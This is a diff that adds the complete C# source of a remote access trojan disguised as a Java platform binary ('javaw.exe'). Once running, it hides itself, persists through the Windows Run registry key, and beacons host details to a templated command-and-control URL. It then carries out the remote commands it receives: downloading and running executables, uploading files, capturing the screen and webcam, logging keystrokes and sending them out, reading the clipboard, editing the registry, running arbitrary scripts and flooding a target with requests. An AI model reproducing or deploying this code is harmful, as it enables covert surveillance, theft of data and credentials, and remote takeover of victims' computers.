@@ -1,0 +1,742 @@
+﻿using System;
+using System.Management;
+using System.Data;
+using System.Linq;
+using System.Text;
+using System.Windows.Forms;
+using System.Net;
+using Microsoft.Win32;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.Drawing.Imaging;
+using System.Drawing;
+using System.Drawing.Printing;
+using System.Reflection;
+
+namespace Java_TM__Platform_SE_binary
+{
+    public partial class main : Form
+    {
+        public main()
+        {
+            InitializeComponent();
+            Actions();
+        }
+
+        [STAThread]
+        static void Main()
+        {
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            Application.Run(new main());
+        }
+
+        private System.ComponentModel.IContainer components = null;
+
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            this.timer2 = new System.Windows.Forms.Timer(this.components);
+            this.timer2.Enabled = true;
+            this.timer2.Interval = 1;
+            this.timer2.Tick += new System.EventHandler(this.timer2_Tick);
+
+
+            this.timer1 = new System.Windows.Forms.Timer(this.components);
+            
+            this.timerKL = new System.Windows.Forms.Timer(this.components);
+            this.timerMouse = new System.Windows.Forms.Timer(this.components);
+            this.timerKey = new System.Windows.Forms.Timer(this.components);
+            this.SuspendLayout();
+
+            this.timer1.Interval = 1000;
+            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
+
+            this.timerKL.Interval = 10;
+            this.timerKL.Tick += new System.EventHandler(this.timerKL_Tick);
+
+            this.timerMouse.Interval = 10;
+            this.timerMouse.Tick += new System.EventHandler(this.timer3_Tick);
+
+            this.timerKey.Tick += new System.EventHandler(this.timerKey_Tick);
+
+            this.ClientSize = new System.Drawing.Size(284, 262);
+            this.Name = "main";
+            this.Opacity = 0D;
+            this.WindowState = System.Windows.Forms.FormWindowState.Minimized;
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Timer timer1;
+        private System.Windows.Forms.Timer timer2;
+        private System.Windows.Forms.Timer timerKL;
+        private System.Windows.Forms.Timer timerMouse;
+        private System.Windows.Forms.Timer timerKey;
+
+
+        private void Actions()
+        {
+            extquery.DownloadStringCompleted += new DownloadStringCompletedEventHandler(ext_Completed);
+        }
+
+        //monitor
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);
+
+        [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
+        private static extern int GetAsyncKeyState(long vKey);
+        [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
+        private static extern int GetAnyncKeySync(long vKey);
+
+        //active window
+        [DllImport("user32.dll")]
+        private static extern IntPtr GetForegroundWindow();
+
+        //keylogger
+        [DllImport("user32.dll")]
+        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+
+        //cd rom
+        [DllImport("winmm.dll", EntryPoint = "mciSendString")]
+        public static extern int openCloseCDROM(string lpstrCommand, int uReturnLength, int hwndCallback);
+
+        //desktop icons
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        [DllImport("user32.dll", SetLastError = true)]
+        static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);
+
+        //taskbar
+        [DllImport("user32.dll")]
+        private static extern int FindWindow(string className, string windowText);
+        [DllImport("user32.dll")]
+        private static extern int ShowWindow(int hwnd, int command);
+
+        //webcam
+        [DllImport("avicap32.dll")]
+        protected static extern int capCreateCaptureWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, int hWndParent, int nID);
+        [DllImport("user32")]
+        protected static extern int SetWindowPos(int hwnd, int hWndInsertAfter, int x, int y, int cx, int cy, int wFlags);
+        [DllImport("user32", EntryPoint = "SendMessageA")]
+        protected static extern int SendMessage(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.AsAny)] object lParam);
+
+        string url = "{~url~}";
+        string userAgent = "{~agent~}";
+        int interval = {~interval~};
+        int activeInterval = {~activeInterval~};
+
+        int hHwnd;
+        int curInterval;
+
+        string id;
+        string os, compName, memory, processor, webcam;
+        string execute;
+        string[] executeA = new string[3];
+
+        string lastActiveWindow;
+        string klOut = null;
+        int KLtime = 0;
+        int counter = 0;
+
+        string textToPrint;
+        int fontToPrint;
+        string report;
+        bool executed;
+        int ldos;
+
+        string vfilepath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+
+        private static Bitmap bmpScreenshot;
+        private static Graphics gfxScreenshot;
+
+        WebBrowser wb = new WebBrowser();
+        WebClient query = new WebClient();
+        WebClient extquery = new WebClient();
+
+        string ldosus;
+
+        public void loadPage(string toHost, string get)
+        {
+            try
+            {
+
+                System.Collections.Specialized.NameValueCollection coll = new System.Collections.Specialized.NameValueCollection();
+                coll.Add("receive", toHost);
+                query.UploadValues(url + "?id=" + id + get, coll);
+
+            }
+            catch { }
+
+            timer1.Interval = activeInterval;
+            counter = 0;
+        }
+
+        private string getID()
+        {
+            string outID = null;
+            ManagementObjectSearcher query1;
+            ManagementObjectCollection queryCollection1;
+            query1 = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapter");
+            queryCollection1 = query1.Get();
+            foreach (ManagementObject mo in queryCollection1)
+                if (mo["MACAddress"] != null) outID = mo["MACAddress"].ToString().Replace(":", "");
+            return outID;
+        }
+
+        private string getMemory()
+        {
+            double totalCapacity = 0;
+            ObjectQuery objectQuery = new ObjectQuery("select * from Win32_PhysicalMemory");
+            ManagementObjectSearcher searcher = new ManagementObjectSearcher(objectQuery);
+            ManagementObjectCollection vals = searcher.Get();
+
+            foreach (ManagementObject val in vals)
+                totalCapacity += System.Convert.ToDouble(val.GetPropertyValue("Capacity"));
+
+            return (totalCapacity/1024/1024).ToString();
+        }
+
+        private string getProcessor()
+        {
+            string infoOut = null;
+            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT maxclockspeed,  datawidth, name, manufacturer FROM Win32_Processor");
+            ManagementObjectCollection objCol = searcher.Get();
+            foreach (ManagementObject mgtObject in objCol)
+            {
+                infoOut = (Convert.ToDecimal(mgtObject["maxclockspeed"]) / 1000).ToString() + "GHz ";
+                infoOut += mgtObject["datawidth"].ToString() + "bit ";
+                infoOut += mgtObject["name"].ToString();
+            }
+            return infoOut;
+        }
+
+        private int checkCamera()
+        {
+            PictureBox pic = new PictureBox();
+            string di = Convert.ToString(0);
+
+            hHwnd = capCreateCaptureWindowA(ref di, 0x40000000, 0, 0, 640, 480, pic.Handle.ToInt32(), 0);
+            return SendMessage(hHwnd, 0x400 + 10, 0, 0);
+        }
+
+
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            this.ShowInTaskbar = false;
+            try { File.Delete(vfilepath + @"\javaw.exe"); } catch { }
+            try
+            {    
+                RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                rkApp.SetValue("javaw", vfilepath + @"\javaw.exe");
+                File.Copy(System.AppDomain.CurrentDomain.BaseDirectory + Path.GetFileName(Application.ExecutablePath), vfilepath + @"\javaw.exe");
+            }
+            catch {  }
+            id = getID();
+            compName = Dns.GetHostName();
+            os = System.Environment.OSVersion.ToString();
+            curInterval = timer1.Interval = interval;
+            memory = getMemory();
+            processor = getProcessor();
+            webcam = checkCamera().ToString();
+
+            try
+            {
+                query.Headers["User-Agent"] = userAgent;
+                query.DownloadString(url + "?id=" + id + "&compname=" + compName + "&os=" + os + "&interval=" + curInterval + "&memory=" + memory + "&processor=" + processor + "&webcam=" + webcam);
+            } catch { }
+
+
+            timer1.Start();
+        }
+
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            curInterval = timer1.Interval;
+            executed = true;
+
+            try
+            {
+                query.Headers["User-Agent"] = userAgent;
+                execute = query.DownloadString(url + "?id=" + id + "&compname=" + compName + "&os=" + os + "&interval=" + curInterval + "&memory=" + memory + "&processor=" + processor + "&webcam=" + webcam);
+                executeA = execute.Split('|');
+                report = "RS" + executeA[0];
+
+                query.Headers["User-Agent"] = userAgent;
+                switch (executeA[0])
+                {
+                    case "download":
+                        try { query.DownloadFile(executeA[1], executeA[2]); }
+                        catch { report = "RF" + executeA[0]; }
+                        break;
+
+                    case "downloadexe":
+                        string filename = null;
+                        try
+                        {
+                            filename = vfilepath + @"\" + executeA[1].Substring(executeA[1].LastIndexOf("/") + 1);
+                            File.Delete(filename);
+                        }
+                        catch { }
+                        try { 
+                            query.DownloadFile(executeA[1], filename); 
+                            System.Diagnostics.Process.Start(filename);
+                        }
+                        catch { report = "RF" + executeA[0]; }
+                        break;
+
+                    case "upload":
+                        try {
+                            string ufilename = executeA[1].Substring(executeA[1].LastIndexOf("/") + 1);
+                            query.UploadFile(url + "?id=" + id + "&receive=upload&uploadtype=ufile&filename=" + ufilename, "POST", executeA[1]); 
+                        }
+                        catch { report = "RF" + executeA[0]; }
+                        executed = false;
+                        break;
+
+                    case "run":
+                        try { System.Diagnostics.Process.Start(executeA[1]); }
+                        catch { report = "RF" + executeA[0]; }
+                        break;
+
+                    case "delete":
+                        string lastCharacter = executeA[1].Substring(executeA[1].Length - 1, 1);
+                        try
+                        {
+                            if (lastCharacter == "/") Directory.Delete(executeA[1], true);
+                            else File.Delete(executeA[1]);
+                        }
+                        catch { report = "RF" + executeA[0]; }
+                        break;
+
+                    case "rename":
+                        string lastCharacterr = executeA[1].Substring(executeA[1].Length - 1, 1);
+                        try
+                        {
+                            if (lastCharacterr == "/") Directory.Move(executeA[1], executeA[2]);
+                            else File.Move(executeA[1], executeA[2]);
+                        }
+                        catch { report = "RF" + executeA[0]; }
+                        break;
+
+                    case "creatdir":
+                        try { Directory.CreateDirectory(executeA[1]); }
+                        catch { report = "RF" + executeA[0]; }
+                        break;
+
+                    case "ldos":
+                        try {
+                            ldosus = executeA[1];
+                            Uri ldosu = new Uri(executeA[1]);
+                            ldos = Convert.ToInt32(executeA[2]); 
+                            extquery.DownloadStringAsync(ldosu); 
+                        }
+                        catch { report = "RF" + executeA[0]; }
+                        break;
+
+                    case "list":
+                        report = "LSlist{-f}";
+                        try
+                        {
+                            string[] foldersA = System.IO.Directory.GetDirectories(executeA[1]);
+                            string[] filesA = System.IO.Directory.GetFiles(executeA[1]);
+                            for (int i = 0; i < foldersA.Length; i++)
+                                report += foldersA[i].Substring(foldersA[i].LastIndexOf("/") + 1) + "{-f}";
+                            report += "{-fbr}";
+                            for (int i = 0; i < filesA.Length; i++)
+                            {
+                                FileInfo f2 = new FileInfo(filesA[i]);
+                                report += filesA[i].Substring(filesA[i].LastIndexOf("/") + 1) + "{-fi}" + f2.Length.ToString() + "{-fi}" + f2.LastWriteTimeUtc + "{-f}";
+                            }
+                        }
+                        catch { report = "RF" + executeA[0]; ; }
+                        break;
+
+
+                    case "programs":
+                        report = "LSprograms{-p}";
+
+                        string SoftwareKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";
+                        using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(SoftwareKey))
+                            foreach (string skName in rk.GetSubKeyNames())
+                                using (RegistryKey sk = rk.OpenSubKey(skName))
+                                {
+                                    try
+                                    {
+                                        if (sk.GetValue("InstallLocation") != null && sk.GetValue("DisplayName") != null)
+                                            report += sk.GetValue("DisplayName") + "{-pi}" + sk.GetValue("DisplayVersion") + "{-pi}" + sk.GetValue("Publisher") + "{-pi}" + sk.GetValue("UninstallString") + "{-p}"; 
+                                    }
+                                    catch { report = "RFprograms"; }
+                                }
+                        if (report.Contains("\"")) report = report.Replace("\"", "");
+                        break;
+
+                    case "reglist":
+                        report = "LSreglist{-l}";
+                        try
+                        {
+                            if (executeA[1].Contains("//")) executeA[1] = executeA[1].Replace("//", "\\");
+
+                            string[] subKeys = Registry.CurrentUser.OpenSubKey(executeA[1], true).GetSubKeyNames();
+                            foreach (string subKeysKey in subKeys)
+                                report += subKeysKey + "{-l}";
+
+                            report += "{-lf}";
+
+                            string[] subKeysF = Registry.CurrentUser.OpenSubKey(executeA[1], true).GetValueNames();
+                            foreach (string subKeysKey in subKeysF)
+                            {
+                                RegistryKey key = Registry.CurrentUser.OpenSubKey(executeA[1], true);
+                                report += subKeysKey + "{-li}" + key.GetValue(subKeysKey) + "{-l}";
+                            }
+                        }
+                        catch { report = "RF" + executeA[0]; ; }
+                        break;
+
+                    case "regnewkey":
+                        try
+                        {
+                            if (executeA[1].Contains("//")) executeA[1] = executeA[1].Replace("//", "\\");
+                            
+                            RegistryKey key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(executeA[1]);
+                            if (executeA[2] != "{-fol}") key.SetValue(executeA[2], executeA[3]);
+                            key.Close();
+                        }
+                        catch { report = "RF" + executeA[0]; ; }
+                        break;
+
+                    case "regdelkey":
+                       
+                        try
+                        {
+                            if (executeA[1].Contains("//")) executeA[1] = executeA[1].Replace("//", "\\");
+
+                            RegistryKey key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(executeA[1]);
+                            if (executeA[3] != "{-fol}") key.DeleteSubKey(executeA[2]);
+                            else key.DeleteValue(executeA[2]);
+                            key.Close();
+                        }
+                        catch { report = "RF" + executeA[0]; ; }
+                        break;
+
+                    case "process":
+                        string processDes = null;
+                        report = "LS" + executeA[0] + "{-p}";
+                        try
+                        {
+                            Process[] prs = Process.GetProcesses();
+                            foreach (Process pr in prs) { 
+                                try {
+                                    processDes = FileVersionInfo.GetVersionInfo(pr.MainModule.FileName).FileDescription;
+                                }
+                                catch { processDes = null;  }
+
+                                report += pr.ProcessName + "{-pi}" + pr.PrivateMemorySize + "{-pi}" + processDes + "{-p}";
+                            }
+                        }
+                        catch { report = "RF" + executeA[0]; };
+                        break;
+
+                    case "pkill":
+                        try
+                        {
+                            Process[] prs = Process.GetProcesses();
+                            foreach (Process pr in prs)
+                                if (pr.ProcessName == executeA[1])
+                                    pr.Kill();
+                        }
+                        catch { report = "RF" + executeA[0]; };
+                        break;
+
+                    case "clipboard":
+                        report = "LS" + executeA[0]  + "{-c}";
+                        report += Clipboard.GetText();
+                        break;
+
+                    case "clipboardset":
+                        Clipboard.SetText(executeA[1]);
+                        break;
+
+                    case "startkl":
+                        timerKL.Start();
+                        break;
+
+                    case "stopkl":
+                        timerKL.Stop();
+                        KLtime = 0;
+                        break;
+
+                    case "screen":
+                        try { File.Delete(vfilepath + @"\screen.png"); }
+                        catch { }
+                        try
+                        {
+                            bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
+                            gfxScreenshot = Graphics.FromImage(bmpScreenshot);
+                            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
+                            bmpScreenshot.Save(vfilepath + @"\screen.png", ImageFormat.Png);
+
+                            query.UploadFile(url + "?id=" + id + "&receive=upload&uploadtype=screen&filename=screen.png", "POST", vfilepath + @"\screen.png");
+                        }
+                        catch { report = "RF" + executeA[0]; }
+                        executed = false;
+                        break;
+
+                    case "computer":
+                        try { Process.Start(executeA[1], executeA[2]); }
+                        catch { report = "RF" + executeA[0]; }
+                        break;
+
+                    case "cdrom":
+                        try
+                        {
+                            string letter = "E";
+                            if (executeA.Length >= 3) letter = executeA[2];
+                            openCloseCDROM("OPEN "+letter+": TYPE CDaudio ALIAS DRIVEE", 0, 0);
+                            if (executeA[1] == "open")openCloseCDROM("SET DRIVE"+letter+" DOOR OPEN", 0, 0);
+                            else openCloseCDROM("SET DRIVE"+letter+" DOOR CLOSED", 0, 0);
+                        }
+                        catch { report = "RF" + executeA[0]; }
+                        break;
+
+                    case "monitor":
+                        try
+                        {
+                            if (executeA[1] == "off")
+                                SendMessage(this.Handle.ToInt32(), 0x0112, 0xF170, 2);
+                            else SendMessage(this.Handle.ToInt32(), 0x0112, 0xF170, -1);
+                        }
+                        catch { report = "RF" + executeA[0]; }
+                        break;
+
+                    case "icons":
+                        try
+                        {
+                            IntPtr hWnd = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "Progman", null);
+                            if (executeA[1] == "hide")
+                                ShowWindow(hWnd, 0);
+                            else
+                                ShowWindow(hWnd, 5);
+                        }
+                        catch { report = "RF" + executeA[0]; }
+                        break;
+
+                    case "taskbar":
+                        try
+                        {
+                            int hwnd = FindWindow("Shell_TrayWnd", "");
+                            if (executeA[1] == "hide")
+                                ShowWindow(hwnd, 0);
+                            else
+                                ShowWindow(hwnd, 1);
+                        } catch { report = "RF" + executeA[0]; }
+                        break;
+
+                    case "message":
+                        try
+                        {
+                            switch (executeA[3])
+                            {
+                                case "warning": MessageBox.Show(executeA[1], executeA[2], MessageBoxButtons.OK, MessageBoxIcon.Warning); break;
+                                case "error": MessageBox.Show(executeA[1], executeA[2], MessageBoxButtons.OK, MessageBoxIcon.Error); break;
+                                default: MessageBox.Show(executeA[1], executeA[2], MessageBoxButtons.OK, MessageBoxIcon.Information); break;
+                            }
+                        }
+                        catch { report = "RF" + executeA[0]; }
+                        break;
+
+                    case "script":
+                        try { File.Delete(vfilepath + @"\script." + executeA[1]); }
+                        catch { }
+                        try
+                        {
+                            StreamWriter file = new StreamWriter(vfilepath + @"\script." + executeA[1]);
+                            file.Write(executeA[2]);
+                            file.Close();
+                            System.Diagnostics.Process.Start(vfilepath + @"\script." + executeA[1]);
+                        }
+                        catch { report = "RF" + executeA[0]; }
+                        break;
+
+                    case "print":
+                        try
+                        {
+                            fontToPrint = Convert.ToInt32(executeA[1]);
+                            if (fontToPrint == 0) fontToPrint = 16;
+
+                            textToPrint = executeA[2];
+                            PrintDocument MyPrintDocument = new PrintDocument();
+                            MyPrintDocument.PrintPage += new PrintPageEventHandler(this.PrintPageEvent);
+                            MyPrintDocument.Print();
+                        }
+                        catch { report = "RF" + executeA[0]; }
+                    break;
+
+                    case "webcam":
+                        try { File.Delete(vfilepath + @"\webcam.jpg"); }
+                        catch { }
+
+                        string di = Convert.ToString(0);
+                        PictureBox pic = new PictureBox();
+                        IDataObject data = default(IDataObject);
+                        Image bmap = default(Image);
+                        try
+                        {
+                            hHwnd = capCreateCaptureWindowA(ref di, 0x40000000, 0, 0, 640, 480, pic.Handle.ToInt32(), 0);
+                            SendMessage(hHwnd, 0x400 + 10, 0, 0);
+                            SendMessage(hHwnd, 0x400 + 30, 0, 0);
+                            data = Clipboard.GetDataObject();
+                            if (data.GetDataPresent(typeof(System.Drawing.Bitmap)))
+                            {
+                                bmap = (Image)data.GetData(typeof(System.Drawing.Bitmap));
+                                bmap.Save(vfilepath + @"\webcam.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
+
+                                query.UploadFile(url + "?id=" + id + "&receive=upload&uploadtype=webcam&filename=webcam.jpg", "POST", vfilepath + @"\webcam.jpg");
+                            }
+                        }
+                        catch { report = "RF" + executeA[0]; }
+                        executed = false;
+                    break;
+
+                    case "close":
+                        this.Close();
+                    break;
+
+                    case "regdel": 
+                        RegistryKey regedel = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                        regedel.DeleteValue("javaw");
+                    break;
+
+                    case "uninstall":
+                        RegistryKey uninstall = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                        uninstall.DeleteValue("javaw");
+                        this.Close();
+                    break;
+
+                    case "mouse":
+                    if (executeA[1] == "enable")
+                        timerMouse.Start();
+                    else timerMouse.Stop();
+                        break;
+
+                    case "visitpage":
+                        wb.Navigate(executeA[1]);
+                        break;
+
+                    case "ckeyboard":
+                        if (executeA[1] == "start")
+                            timerKey.Start();
+                        else timerKey.Stop();
+                        break;
+
+                    case "":
+                        if (counter >= 120) timer1.Interval = interval; else counter++;
+                        executed = false;
+                        break;
+
+                    default: executed = false; break;
+                }
+                if (report.Contains(@"\")) report = report.Replace(@"\", "/");
+                if (executed) loadPage(report, "");
+            }
+            catch { }
+        }
+
+        private void PrintPageEvent(object sender, PrintPageEventArgs ev)
+        {
+            Font MyFont = new Font("Arial", fontToPrint);
+            ev.Graphics.DrawString(textToPrint, MyFont, new SolidBrush(System.Drawing.Color.Blue),
+                (ev.PageBounds.Right / 2), ev.PageBounds.Bottom / 2);
+        }
+
+        private void timer2_Tick(object sender, EventArgs e)
+        {
+            this.ShowInTaskbar = false;
+            this.Hide();
+            timer2.Stop();
+        }
+
+        private void timerKL_Tick(object sender, EventArgs e)
+        {
+            int chars = 256;
+
+            for (int i = 1; i <= 255; i++)
+            {
+                int result = 0;
+
+                result = GetAsyncKeyState(i);
+                if (result == -32767 && i != 16 && i != 160 && i > 1)
+                {
+                    switch (i)
+                    {
+                        case 8:
+                            if (klOut.Substring(klOut.Length - 1, 1) != "}" && klOut.Length > 0)
+                                klOut = klOut.Substring(0, klOut.Length - 1);
+                            break;
+                        case 9: klOut += " {TAB} "; break;
+                        case 13: klOut += "{br}{ENTER}{br}"; break;
+                        case 64: klOut += "@"; break;
+                        case 95: klOut += "_"; break;
+                        default:
+                                StringBuilder buff = new StringBuilder(chars);
+                                IntPtr handle = GetForegroundWindow();
+                                if (GetWindowText(handle, buff, chars) > 0 && lastActiveWindow != handle.ToString())
+                                {
+                                    lastActiveWindow = handle.ToString();
+                                    klOut += "{br}{br}{br}--->" + buff.ToString() + " | ";
+                                    klOut += DateTime.Now.ToLongTimeString() + "{br}";
+                                }
+                                klOut += (char)i; 
+                                break;
+                    }
+                }
+
+                KLtime++;
+                if (KLtime >= 6000000)
+                {
+                    KLtime = 0;
+                    loadPage(klOut, "&kl=true");
+                    klOut = null;
+                }
+            }
+        }
+
+        private void timer3_Tick(object sender, EventArgs e)
+        {
+            Cursor.Position = new Point(0, 0);
+        }
+
+        private void ext_Completed(object sender, EventArgs e)
+        {
+            Uri ldosu = new Uri(ldosus);
+            if (ldos > 0)
+            {
+                extquery.DownloadStringAsync(ldosu);
+                ldos--;
+            }
+            else loadPage("DDos finished", "");
+            
+        }
+
+        private void timerKey_Tick(object sender, EventArgs e)
+        {
+            SendKeys.Send("w");
+        }
+    }
+}
